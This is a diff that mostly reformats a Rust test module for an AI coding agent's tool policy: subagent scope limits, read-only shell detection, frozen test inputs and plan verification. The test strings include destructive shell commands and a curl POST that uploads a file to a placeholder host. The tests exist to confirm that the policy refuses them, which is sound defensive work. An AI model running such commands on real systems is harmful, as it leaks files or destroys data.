@@ -20,16 +20,14 @@ pub(crate) mod web;
 pub(crate) use ctx::{MIN_PLAN_BUDGET_TOKENS, ReadState, ToolCtx};
 pub(crate) use dispatch::{FileDiff, Outcome, bg_running_commands, execute, kill_remaining_jobs};
 pub(crate) use policy::{
-    bash_scope_hit, forbidden_command, frozen_input_command_hit,
-    register_mention_prereads, register_subagent_scope,
-    take_mention_prereads, take_subagent_scope,
+    bash_scope_hit, forbidden_command, frozen_input_command_hit, register_mention_prereads,
+    register_subagent_scope, take_mention_prereads, take_subagent_scope,
+};
+pub(crate) use specs::{
+    Kind, call_path, call_summary, decode_child_output, is_multi_file_mutation, is_mutating_call,
+    is_readonly_bash, merge_specs, tool_names, tool_specs, trim_middle,
 };
 pub(crate) use verify::capture_baselines;
-pub(crate) use specs::{
-    call_path, call_summary, decode_child_output, is_multi_file_mutation,
-    is_mutating_call, is_readonly_bash, merge_specs, tool_names,
-    tool_specs, trim_middle, Kind,
-};
 
 #[cfg(test)]
 mod tests {
@@ -113,7 +111,8 @@ mod tests {
         .unwrap();
     }
 
-    fn plan_with(acceptance: Vec<&str>) -> plan::Plan {        plan::create(
+    fn plan_with(acceptance: Vec<&str>) -> plan::Plan {
+        plan::create(
             "prove the checks".to_string(),
             Vec::new(),
             acceptance.into_iter().map(str::to_string).collect(),
@@ -148,7 +147,10 @@ mod tests {
             plan::check_definition_hash("exit 3")
         );
         assert!(!baseline.output_hash.is_empty());
-        assert!(proof.slots[1].is_none(), "a check that passes proves nothing");
+        assert!(
+            proof.slots[1].is_none(),
+            "a check that passes proves nothing"
+        );
         assert!(proof.slots[2].is_none(), "manual items are never run");
         assert!(
             proof.frozen[3].is_none(),
@@ -299,7 +301,11 @@ mod tests {
             &json!({"file_path": "notes.txt", "content": "elsewhere\n"}),
         );
         assert!(!outside.ok, "{}", outside.output);
-        assert!(outside.output.contains("subagent_scope"), "{}", outside.output);
+        assert!(
+            outside.output.contains("subagent_scope"),
+            "{}",
+            outside.output
+        );
 
         let read = execute(&mut ctx, "read", &json!({"file_path": "README.md"}));
         assert!(read.ok, "{}", read.output);
@@ -340,8 +346,15 @@ mod tests {
         // a redirect outside the scope refuses BEFORE executing
         let outside = execute(&mut ctx, "bash", &json!({"command": "echo x > notes.txt"}));
         assert!(!outside.ok, "{}", outside.output);
-        assert!(outside.output.contains("subagent_scope"), "{}", outside.output);
-        assert!(!dir.join("notes.txt").exists(), "refused write must not land");
+        assert!(
+            outside.output.contains("subagent_scope"),
+            "{}",
+            outside.output
+        );
+        assert!(
+            !dir.join("notes.txt").exists(),
+            "refused write must not land"
+        );
 
         // the same redirect inside the scope runs
         let inside = execute(
@@ -358,22 +371,22 @@ mod tests {
 
         // git_stage paths obey the scope; all:true is unbounded, refused.
         // (`..` escapes die in the tool's own jail — also refused, other code.)
-        let stage_out = execute(
-            &mut ctx,
-            "git_stage",
-            &json!({"paths": ["notes.txt"]}),
-        );
+        let stage_out = execute(&mut ctx, "git_stage", &json!({"paths": ["notes.txt"]}));
         assert!(!stage_out.ok, "{}", stage_out.output);
-        assert!(stage_out.output.contains("subagent_scope"), "{}", stage_out.output);
-        let stage_escape = execute(
-            &mut ctx,
-            "git_stage",
-            &json!({"paths": ["../outside.txt"]}),
+        assert!(
+            stage_out.output.contains("subagent_scope"),
+            "{}",
+            stage_out.output
         );
+        let stage_escape = execute(&mut ctx, "git_stage", &json!({"paths": ["../outside.txt"]}));
         assert!(!stage_escape.ok, "{}", stage_escape.output);
         let stage_all = execute(&mut ctx, "git_stage", &json!({"all": true}));
         assert!(!stage_all.ok, "{}", stage_all.output);
-        assert!(stage_all.output.contains("subagent_scope"), "{}", stage_all.output);
+        assert!(
+            stage_all.output.contains("subagent_scope"),
+            "{}",
+            stage_all.output
+        );
 
         // git_commit all:true sweeps the whole tree, refused; a plain
         // commit only seals the (gated) stage, so it passes the gate
@@ -383,7 +396,11 @@ mod tests {
             &json!({"message": "sweep", "all": true}),
         );
         assert!(!commit_all.ok, "{}", commit_all.output);
-        assert!(commit_all.output.contains("subagent_scope"), "{}", commit_all.output);
+        assert!(
+            commit_all.output.contains("subagent_scope"),
+            "{}",
+            commit_all.output
+        );
         let commit_plain = execute(&mut ctx, "git_commit", &json!({"message": "seal"}));
         assert!(
             !commit_plain.output.contains("subagent_scope"),
@@ -823,11 +840,17 @@ mod tests {
             description: "d".into(),
             parameters: serde_json::json!({"type": "object"}),
         };
-        let merged = merge_specs(vec![spec("read"), spec("write")], &[spec("zzz"), spec("aaa")]);
+        let merged = merge_specs(
+            vec![spec("read"), spec("write")],
+            &[spec("zzz"), spec("aaa")],
+        );
         let names: Vec<String> = merged.iter().map(|t| t.name.clone()).collect();
         assert_eq!(names, vec!["aaa", "read", "write", "zzz"]);
         // server order must not leak through: reversed input, same output
-        let merged = merge_specs(vec![spec("read"), spec("write")], &[spec("aaa"), spec("zzz")]);
+        let merged = merge_specs(
+            vec![spec("read"), spec("write")],
+            &[spec("aaa"), spec("zzz")],
+        );
         let names: Vec<String> = merged.iter().map(|t| t.name.clone()).collect();
         assert_eq!(names, vec!["aaa", "read", "write", "zzz"]);
     }
@@ -884,8 +907,10 @@ mod tests {
     #[test]
     fn tool_schemas_are_mode_independent() {
         let names = |plan_mode: bool| {
-            let mut names: Vec<String> =
-                tool_specs(plan_mode).iter().map(|t| t.name.clone()).collect();
+            let mut names: Vec<String> = tool_specs(plan_mode)
+                .iter()
+                .map(|t| t.name.clone())
+                .collect();
             names.sort();
             names
         };
@@ -910,8 +935,14 @@ mod tests {
     #[test]
     fn multi_file_mutation_splits_soft_from_hard() {
         use serde_json::json;
-        assert!(!is_multi_file_mutation("write", &json!({"file_path": "a.rs"})));
-        assert!(!is_multi_file_mutation("edit", &json!({"file_path": "a.rs"})));
+        assert!(!is_multi_file_mutation(
+            "write",
+            &json!({"file_path": "a.rs"})
+        ));
+        assert!(!is_multi_file_mutation(
+            "edit",
+            &json!({"file_path": "a.rs"})
+        ));
         assert!(!is_multi_file_mutation(
             "multi_edit",
             &json!({"file_path": "a.rs", "edits": []})
@@ -925,15 +956,24 @@ mod tests {
             &json!({"patch": "diff --git a/a.rs b/a.rs\n--- x\ndiff --git a/b.rs b/b.rs\n--- y\n"})
         ));
         assert!(is_multi_file_mutation("patch", &json!({})));
-        assert!(is_multi_file_mutation("patch", &json!({"patch": "garbage"})));
-        assert!(is_multi_file_mutation("bash", &json!({"command": "rm -rf x"})));
+        assert!(is_multi_file_mutation(
+            "patch",
+            &json!({"patch": "garbage"})
+        ));
+        assert!(is_multi_file_mutation(
+            "bash",
+            &json!({"command": "rm -rf x"})
+        ));
         // bounded index ops go soft; the all:true variants stage the tree
         assert!(!is_multi_file_mutation(
             "git_stage",
             &json!({"paths": ["src/a.rs"]})
         ));
         assert!(is_multi_file_mutation("git_stage", &json!({"all": true})));
-        assert!(!is_multi_file_mutation("git_commit", &json!({"message": "x"})));
+        assert!(!is_multi_file_mutation(
+            "git_commit",
+            &json!({"message": "x"})
+        ));
         assert!(is_multi_file_mutation(
             "git_commit",
             &json!({"message": "x", "all": true})
@@ -945,9 +985,8 @@ mod tests {
     /// gate consults it, approvals do not.
     #[test]
     fn readonly_bash_covers_inspection_but_nothing_else() {
-        let bash = |command: &str| {
-            is_readonly_bash("bash", &serde_json::json!({"command": command}))
-        };
+        let bash =
+            |command: &str| is_readonly_bash("bash", &serde_json::json!({"command": command}));
         // observed read-only shapes from a real inspection session
         assert!(bash(
             "powershell -NoProfile -Command \"Get-Process | Sort-Object CPU -Descending | Select-Object -First 25 Name, Id\""
@@ -958,7 +997,9 @@ mod tests {
         assert!(bash("netstat -ano | findstr LISTENING"));
         assert!(bash("netstat -ano | findstr ESTABLISHED"));
         assert!(bash("schtasks /query /FO TABLE | more"));
-        assert!(bash("reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"));
+        assert!(bash(
+            "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        ));
         assert!(bash("tasklist /FI \"PID eq 20912\" /FO TABLE"));
         assert!(bash(
             "powershell -NoProfile -Command \"Get-MpComputerStatus | Select-Object AntivirusEnabled\""
@@ -966,7 +1007,9 @@ mod tests {
         // writes, chains into writes, redirect, subexpressions: all mutating
         assert!(!bash("Get-Process; Remove-Item C:\\temp\\x"));
         assert!(!bash("echo hi > out.txt"));
-        assert!(!bash("powershell -NoProfile -Command \"Get-Process\" | Out-File x.txt"));
+        assert!(!bash(
+            "powershell -NoProfile -Command \"Get-Process\" | Out-File x.txt"
+        ));
         assert!(!bash("powershell -c \"rm foo\""));
         assert!(!bash("netstat -ano & del C:\\t"));
         assert!(!bash("powershell -Command \"$(rm foo)\""));
@@ -976,7 +1019,10 @@ mod tests {
         assert!(!bash(""));
         assert!(!bash("   "));
         // not bash at all
-        assert!(!is_readonly_bash("read", &serde_json::json!({"file_path": "a"})));
+        assert!(!is_readonly_bash(
+            "read",
+            &serde_json::json!({"file_path": "a"})
+        ));
         assert!(!is_readonly_bash("bash", &serde_json::json!({})));
     }
 
@@ -1317,16 +1363,14 @@ mod tests {
             session: "epoch-test".into(),
             seq: stale_seq,
         }];
-        let err = validate_attached_records(&dir, &plan_id, "1", &stale)
-            .unwrap_err();
+        let err = validate_attached_records(&dir, &plan_id, "1", &stale).unwrap_err();
         assert!(err.contains("stale_epoch"), "{err}");
 
         let fresh = vec![plan::EvidenceRef {
             session: "epoch-test".into(),
             seq: fresh_seq,
         }];
-        validate_attached_records(&dir, &plan_id, "1", &fresh)
-            .expect("unstamped evidence counts");
+        validate_attached_records(&dir, &plan_id, "1", &fresh).expect("unstamped evidence counts");
         fs::remove_dir_all(&dir).ok();
     }
 
@@ -1364,14 +1408,22 @@ mod tests {
         // empty additions refuse
         let empty = plan_op(&mut ctx, &json!({"op": "add_acceptance", "items": []}));
         assert!(!empty.ok, "{}", empty.output);
-        assert!(empty.output.contains("empty_acceptance"), "{}", empty.output);
+        assert!(
+            empty.output.contains("empty_acceptance"),
+            "{}",
+            empty.output
+        );
         // free text refuses like at create
         let prose = plan_op(
             &mut ctx,
             &json!({"op": "add_acceptance", "items": ["looks good"]}),
         );
         assert!(!prose.ok, "{}", prose.output);
-        assert!(prose.output.contains("untyped_acceptance"), "{}", prose.output);
+        assert!(
+            prose.output.contains("untyped_acceptance"),
+            "{}",
+            prose.output
+        );
         // a failing check plus a human checkpoint: both land pending
         let added = plan_op(
             &mut ctx,
@@ -1410,16 +1462,30 @@ mod tests {
         );
         assert!(created.ok, "{}", created.output);
         let shown = plan_op(&mut ctx, &json!({"op": "show"}));
-        assert!(shown.output.contains("checklist (non-blocking)"), "{}", shown.output);
-        assert!(shown.output.contains("ask Anna about scope"), "{}", shown.output);
+        assert!(
+            shown.output.contains("checklist (non-blocking)"),
+            "{}",
+            shown.output
+        );
+        assert!(
+            shown.output.contains("ask Anna about scope"),
+            "{}",
+            shown.output
+        );
         assert!(plan_op(&mut ctx, &json!({"op": "start", "id": "1"})).ok);
-        assert!(plan_op(
-            &mut ctx,
-            &json!({"op": "finish", "id": "1", "summary": "did it"})
-        )
-        .ok);
+        assert!(
+            plan_op(
+                &mut ctx,
+                &json!({"op": "finish", "id": "1", "summary": "did it"})
+            )
+            .ok
+        );
         let completed = plan_op(&mut ctx, &json!({"op": "complete"}));
-        assert!(completed.ok, "checklist must not block: {}", completed.output);
+        assert!(
+            completed.ok,
+            "checklist must not block: {}",
+            completed.output
+        );
         fs::remove_dir_all(&dir).ok();
     }
 
@@ -1757,8 +1823,11 @@ mod tests {
         );
         // a refused finish leaves the step open; cancel it to move on
         assert!(
-            plan_op(&mut ctx, &json!({"op": "cancel", "id": "1", "reason": "no evidence"}))
-                .ok
+            plan_op(
+                &mut ctx,
+                &json!({"op": "cancel", "id": "1", "reason": "no evidence"})
+            )
+            .ok
         );
 
         // errored diagnostics settle nothing either
@@ -1782,8 +1851,11 @@ mod tests {
             rejected.output
         );
         assert!(
-            plan_op(&mut ctx, &json!({"op": "cancel", "id": "2", "reason": "no evidence"}))
-                .ok
+            plan_op(
+                &mut ctx,
+                &json!({"op": "cancel", "id": "2", "reason": "no evidence"})
+            )
+            .ok
         );
 
         // a recorded write settles any step
@@ -2041,9 +2113,6 @@ mod tests {
         fs::remove_dir_all(&dir).ok();
     }
 
-
-
-
     /// `manual:` items are the user's call. Verify has to refuse them rather
     /// than quietly accept whatever evidence is lying around.
     #[test]
@@ -2110,7 +2179,11 @@ mod tests {
             }),
         );
         assert!(created.ok, "{}", created.output);
-        assert!(created.output.contains("no executable rung"), "{}", created.output);
+        assert!(
+            created.output.contains("no executable rung"),
+            "{}",
+            created.output
+        );
 
         let plan = plan::open_active(&dir).unwrap().unwrap();
         assert_eq!(plan::ladder_top(&plan), None);
@@ -2277,10 +2350,7 @@ mod tests {
             completed.output
         );
         assert_eq!(
-            plan::open_active(&dir)
-                .unwrap()
-                .unwrap()
-                .acceptance[0]
+            plan::open_active(&dir).unwrap().unwrap().acceptance[0]
                 .validation
                 .status,
             plan::ValidationStatus::Passed,
@@ -2393,10 +2463,7 @@ mod tests {
             failed.output
         );
         assert_eq!(
-            plan::open_active(&dir)
-                .unwrap()
-                .unwrap()
-                .acceptance[0]
+            plan::open_active(&dir).unwrap().unwrap().acceptance[0]
                 .validation
                 .status,
             plan::ValidationStatus::Passed,
@@ -2446,10 +2513,7 @@ mod tests {
             completed.output
         );
         assert_eq!(
-            plan::open_active(&dir)
-                .unwrap()
-                .unwrap()
-                .acceptance[0]
+            plan::open_active(&dir).unwrap().unwrap().acceptance[0]
                 .validation
                 .status,
             plan::ValidationStatus::Unknown
@@ -2501,7 +2565,11 @@ mod tests {
             }),
         );
         assert!(created.ok, "{}", created.output);
-        assert!(created.output.contains("empty output"), "{}", created.output);
+        assert!(
+            created.output.contains("empty output"),
+            "{}",
+            created.output
+        );
 
         let out = plan_op(&mut ctx, &json!({"op": "verify", "acceptance": 0}));
         assert!(!out.ok, "{}", out.output);
@@ -2537,10 +2605,7 @@ mod tests {
         assert!(!flaky.ok, "{}", flaky.output);
         assert!(flaky.output.contains("flaky_check"), "{}", flaky.output);
         assert_eq!(
-            plan::open_active(&dir)
-                .unwrap()
-                .unwrap()
-                .acceptance[0]
+            plan::open_active(&dir).unwrap().unwrap().acceptance[0]
                 .validation
                 .status,
             plan::ValidationStatus::Unknown
@@ -2583,10 +2648,7 @@ mod tests {
             failed.output
         );
         assert_eq!(
-            plan::open_active(&dir)
-                .unwrap()
-                .unwrap()
-                .acceptance[0]
+            plan::open_active(&dir).unwrap().unwrap().acceptance[0]
                 .validation
                 .status,
             plan::ValidationStatus::Passed,
@@ -2686,7 +2748,11 @@ mod tests {
             }),
         );
         assert!(created.ok, "{}", created.output);
-        assert!(created.output.contains("stable across 2 runs"), "{}", created.output);
+        assert!(
+            created.output.contains("stable across 2 runs"),
+            "{}",
+            created.output
+        );
 
         // unchanged output is not acceptance here
         let same = plan_op(&mut ctx, &json!({"op": "verify", "acceptance": 0}));
@@ -2738,11 +2804,7 @@ mod tests {
         fs::remove_file(&present).unwrap();
         let broken = plan_op(&mut ctx, &json!({"op": "verify", "acceptance": 1}));
         assert!(!broken.ok, "{}", broken.output);
-        assert!(
-            broken.output.contains("broken_change"),
-            "{}",
-            broken.output
-        );
+        assert!(broken.output.contains("broken_change"), "{}", broken.output);
         assert_eq!(
             plan::open_active(&dir).unwrap().unwrap().acceptance[1].status,
             plan::AcceptanceStatus::Pending
@@ -2794,7 +2856,11 @@ mod tests {
             }),
         );
         assert!(created.ok, "{}", created.output);
-        assert!(created.output.contains("empty output"), "{}", created.output);
+        assert!(
+            created.output.contains("empty output"),
+            "{}",
+            created.output
+        );
 
         let out = plan_op(&mut ctx, &json!({"op": "verify", "acceptance": 0}));
         assert!(!out.ok, "{}", out.output);
@@ -2805,7 +2871,8 @@ mod tests {
     /// Rung 3 through `complete`: the re-run sees moved output and the plan
     /// completes; identical output blocks it.
     #[test]
-    fn complete_reruns_differential_and_blocks_when_unchanged() {        let (mut ctx, dir) = proj();
+    fn complete_reruns_differential_and_blocks_when_unchanged() {
+        let (mut ctx, dir) = proj();
         fs::write(dir.join("data.txt"), "v1").unwrap();
         let command = dump_command(&dir.join("data.txt"));
         let created = plan_op(
@@ -2899,7 +2966,11 @@ mod tests {
             }),
         );
         assert!(created.ok, "{}", created.output);
-        assert!(created.output.contains("froze 1 file(s)"), "{}", created.output);
+        assert!(
+            created.output.contains("froze 1 file(s)"),
+            "{}",
+            created.output
+        );
 
         let verified = plan_op(&mut ctx, &json!({"op": "verify", "acceptance": 0}));
         assert!(verified.ok, "{}", verified.output);
@@ -2933,11 +3004,7 @@ mod tests {
             "{}",
             failed.output
         );
-        assert!(
-            failed.output.contains("src/main.rs"),
-            "{}",
-            failed.output
-        );
+        assert!(failed.output.contains("src/main.rs"), "{}", failed.output);
         fs::remove_dir_all(&dir).ok();
     }
 
@@ -3122,7 +3189,11 @@ mod tests {
             &json!({"file_path": "tests/auth.rs", "old_string": "fn t() {}", "new_string": "fn t() { assert!(true) }"}),
         );
         assert!(!refused.ok, "{}", refused.output);
-        assert!(refused.output.contains("frozen_input"), "{}", refused.output);
+        assert!(
+            refused.output.contains("frozen_input"),
+            "{}",
+            refused.output
+        );
 
         // `..` spellings do not dodge the freeze
         let dodged = execute(
@@ -3256,9 +3327,8 @@ mod tests {
             }),
         );
         assert!(created.ok, "{}", created.output);
-        let hit = |command: &str| {
-            frozen_input_command_hit(&ctx.root, &ctx.session_id, command).is_some()
-        };
+        let hit =
+            |command: &str| frozen_input_command_hit(&ctx.root, &ctx.session_id, command).is_some();
         assert!(hit("echo x > tests/auth.rs"));
         assert!(hit("echo x >> tests/auth.rs"));
         assert!(hit("cat src/main.rs | tee tests/auth.rs"));
@@ -3410,7 +3480,13 @@ mod tests {
         journal
             .append_evidence("file_diff", json!({"path": "README.md"}))
             .unwrap();
-        assert!(plan_op(&mut ctx, &json!({"op": "finish", "id": "1", "summary": "edited"})).ok);
+        assert!(
+            plan_op(
+                &mut ctx,
+                &json!({"op": "finish", "id": "1", "summary": "edited"})
+            )
+            .ok
+        );
         let blocked = plan_op(&mut ctx, &json!({"op": "complete"}));
         assert!(!blocked.ok, "{}", blocked.output);
         assert!(
@@ -3455,7 +3531,13 @@ mod tests {
         journal
             .append_evidence("file_diff", json!({"path": "src/main.rs"}))
             .unwrap();
-        assert!(plan_op(&mut ctx, &json!({"op": "finish", "id": "1", "summary": "edited"})).ok);
+        assert!(
+            plan_op(
+                &mut ctx,
+                &json!({"op": "finish", "id": "1", "summary": "edited"})
+            )
+            .ok
+        );
         let completed = plan_op(&mut ctx, &json!({"op": "complete"}));
         assert!(completed.ok, "{}", completed.output);
         fs::remove_dir_all(&dir).ok();
@@ -3522,7 +3604,11 @@ mod tests {
             }),
         );
         assert!(created.ok, "{}", created.output);
-        assert!(created.output.contains("forbid-import:"), "{}", created.output);
+        assert!(
+            created.output.contains("forbid-import:"),
+            "{}",
+            created.output
+        );
 
         // silent once the author formalized anything
         abandon_as_user(&ctx, &dir);
@@ -4449,7 +4535,10 @@ end
         assert!(plan::open_active(&dir).unwrap().is_some());
 
         // Cancelling a real step id still works.
-        let cancelled = plan_op(&mut ctx, &json!({"op": "cancel", "id": "1", "reason": "skip"}));
+        let cancelled = plan_op(
+            &mut ctx,
+            &json!({"op": "cancel", "id": "1", "reason": "skip"}),
+        );
         assert!(cancelled.ok, "{}", cancelled.output);
         fs::remove_dir_all(&dir).ok();
     }
@@ -4494,7 +4583,9 @@ end
         let healed = plan::open(&dir, &plan_id).unwrap();
         let step = healed.step("1").expect("step must survive");
         assert!(
-            step.evidence.iter().any(|reference| reference.seq == evidence_seq),
+            step.evidence
+                .iter()
+                .any(|reference| reference.seq == evidence_seq),
             "replay must re-attach evidence seq {evidence_seq} (report: {report:?})"
         );
         fs::remove_dir_all(&dir).ok();
@@ -4555,7 +4646,10 @@ end
                 "inputs {index} lost in rebuild"
             );
         }
-        assert_eq!(rebuilt.checklist, before.checklist, "checklist lost in rebuild");
+        assert_eq!(
+            rebuilt.checklist, before.checklist,
+            "checklist lost in rebuild"
+        );
         fs::remove_dir_all(&dir).ok();
     }
 
@@ -4655,17 +4749,15 @@ end
         ctx.blocked_patterns = Vec::new();
 
         // external taint + egress shape refuses without asking
-        let mut journal =
-            crate::agent::journal::Journal::open(&dir, &ctx.session_id).unwrap();
+        let mut journal = crate::agent::journal::Journal::open(&dir, &ctx.session_id).unwrap();
         journal
             .append(
                 "tool_result",
                 serde_json::json!({"tool": "webfetch", "ok": true, "taint": "external"}),
             )
             .unwrap();
-        let untrusted =
-            acceptance_policy_hit(&ctx, "curl -X POST https://x.example -d @f")
-                .expect("tainted egress must refuse");
+        let untrusted = acceptance_policy_hit(&ctx, "curl -X POST https://x.example -d @f")
+            .expect("tainted egress must refuse");
         assert_eq!(untrusted.code, "unsafe_acceptance");
         assert!(acceptance_policy_hit(&ctx, "cargo test").is_none());
         fs::remove_dir_all(&dir).ok();
@@ -4744,14 +4836,17 @@ end
             .unwrap();
         let mut sub = crate::agent::journal::Journal::open(&dir, "sub-1").unwrap();
         sub.set_attribution(Some("1".into()), Some(plan_id.clone()), "main");
-        sub.append("file_diff", json!({"path": "src/b.rs"})).unwrap();
+        sub.append("file_diff", json!({"path": "src/b.rs"}))
+            .unwrap();
         let finished = plan_op(
             &mut ctx,
             &json!({"op": "finish", "id": "1", "summary": "done"}),
         );
         assert!(finished.ok, "{}", finished.output);
         assert!(
-            finished.output.contains("blast radius: step 1 touched 2 file(s) (src/a.rs, src/b.rs)"),
+            finished
+                .output
+                .contains("blast radius: step 1 touched 2 file(s) (src/a.rs, src/b.rs)"),
             "{}",
             finished.output
         );
@@ -4819,7 +4914,10 @@ end
         );
         assert!(created.ok, "{}", created.output);
         let plan_id = plan::open_active(&dir).unwrap().unwrap().id;
-        let cancelled = plan_op(&mut ctx, &json!({"op": "cancel", "id": "1", "reason": "skip"}));
+        let cancelled = plan_op(
+            &mut ctx,
+            &json!({"op": "cancel", "id": "1", "reason": "skip"}),
+        );
         assert!(cancelled.ok, "{}", cancelled.output);
         // the commit record must exist (pre-fix: bare store wrote nothing)
         let records = crate::agent::journal::Journal::records_for(&dir, &ctx.session_id).unwrap();
